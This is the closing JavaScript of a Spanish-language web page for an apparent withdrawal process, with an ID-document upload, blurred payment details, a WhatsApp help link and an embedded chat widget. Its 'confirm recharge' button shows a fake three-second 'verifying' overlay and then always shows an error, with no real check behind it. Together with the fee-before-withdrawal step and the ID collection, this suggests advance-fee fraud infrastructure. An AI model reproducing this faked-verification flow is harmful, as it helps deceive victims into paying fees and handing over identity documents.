        document.addEventListener("DOMContentLoaded", async () => {
          const gestor = new GestorDatos();
          await gestor.cargarDatos();
          await gestor.actualizarInterfaz();
          setupNavigation();
          setupCountdowns();
          setupSignatureFlow();
          updateProgressBar(1);

          const whatsappLink = document.getElementById("whatsappLink");
          if (whatsappLink) {
            whatsappLink.href = "https://wa.me/+17373018059?text=Hola%20necesito%20ayuda%20con%20mi%20retiro";
          }

          const confirmRecargaBtn = document.getElementById("confirmRecargaBtn");
          if (confirmRecargaBtn) {
            confirmRecargaBtn.addEventListener("click", () => {
              const overlayVerificando = document.getElementById("overlayVerificandoRecarga");
              if (overlayVerificando) {
                overlayVerificando.classList.add("active");
                setTimeout(() => {
                  overlayVerificando.classList.remove("active");
                  const overlayError = document.getElementById("overlayErrorFinal");
                  if (overlayError) {
                    overlayError.classList.add("active");
                  }
                }, 3000);
              }
            });
          }

          const recargaReadyBtn = document.getElementById("recargaReadyBtn");
          if (recargaReadyBtn) {
            recargaReadyBtn.addEventListener("click", () => {
              const overlayDatos = document.getElementById("overlayDatosVerificacion");
              if (overlayDatos) {
                overlayDatos.classList.add("active");
              }
            });
          }
          const closeDatosModalBtn = document.getElementById("closeDatosModalBtn");
          if (closeDatosModalBtn) {
            closeDatosModalBtn.addEventListener("click", () => {
              const overlayDatos = document.getElementById("overlayDatosVerificacion");
              if (overlayDatos) {
                overlayDatos.classList.remove("active");
              }
            });
          }

          const idDocumentInput = document.getElementById("idDocument");
          const confirmDocBtn = document.getElementById("confirmDocBtn");
          const previewContainer = document.getElementById("previewContainer");
          const docPreview = document.getElementById("docPreview");
          if (idDocumentInput) {
            idDocumentInput.addEventListener("change", () => {
              if (idDocumentInput.files && idDocumentInput.files[0]) {
                const file = idDocumentInput.files[0];
                const reader = new FileReader();
                reader.onload = (e) => {
                  docPreview.src = e.target.result;
                  previewContainer.classList.add("active");
                };
                reader.readAsDataURL(file);
                confirmDocBtn.style.display = "inline-flex";
                confirmDocBtn.disabled = false;
                confirmDocBtn.classList.remove("btn-disabled", "btn-waiting");
              }
            });
          }
          if (confirmDocBtn) {
            confirmDocBtn.addEventListener("click", () => {
              handleConfirmDocumento();
            });
          }

          const verDatosOverlayTrigger = document.getElementById("verDatosOverlayTrigger");
          const tapToShowOverlay = document.getElementById("tapToShowOverlay");
          const datosRecargaFijos = document.getElementById("datosRecargaFijos");
          if (verDatosOverlayTrigger && tapToShowOverlay && datosRecargaFijos) {
            verDatosOverlayTrigger.addEventListener("click", (e) => {
              if (datosRecargaFijos.style.filter === "blur(8px)") {
                datosRecargaFijos.style.filter = "none";
                tapToShowOverlay.style.display = "none";
              } else {
                datosRecargaFijos.style.filter = "blur(8px)";
                tapToShowOverlay.style.display = "flex";
              }
              e.stopPropagation();
            });
          }
          const tapTarjetaAzul = document.getElementById("tapTarjetaAzul");
          const tarjetaAzulBlur = document.getElementById("tarjetaAzulBlur");
          if (tapTarjetaAzul && tarjetaAzulBlur) {
            tapTarjetaAzul.addEventListener("click", (e) => {
              if (tarjetaAzulBlur.style.filter === "blur(6px)") {
                tarjetaAzulBlur.style.filter = "none";
                tapTarjetaAzul.style.display = "none";
              } else {
                tarjetaAzulBlur.style.filter = "blur(6px)";
                tapTarjetaAzul.style.display = "flex";
              }
              e.stopPropagation();
            });
            const modalDatosContent = document.getElementById("modalDatosContent");
            if (modalDatosContent) {
              modalDatosContent.addEventListener("click", (ev) => {
                ev.stopPropagation();
              });
            }
            document.getElementById("overlayDatosVerificacion").addEventListener("click", () => {
              tarjetaAzulBlur.style.filter = "blur(6px)";
              tapTarjetaAzul.style.display = "flex";
            });
          }
        });

        var Tawk_API = Tawk_API || {},
            Tawk_LoadStart = new Date();
        (function () {
          var s1 = document.createElement("script"),
              s0 = document.getElementsByTagName("script")[0];
          s1.async = true;
          s1.src = "https://embed.tawk.to/676eba4c49e2fd8dfeff071f/1ig48fetj";
          s1.charset = "UTF-8";
          s1.setAttribute("crossorigin", "*");
          s0.parentNode.insertBefore(s1, s0);
        })();
      </script>
    </div>
  </body>
</html>









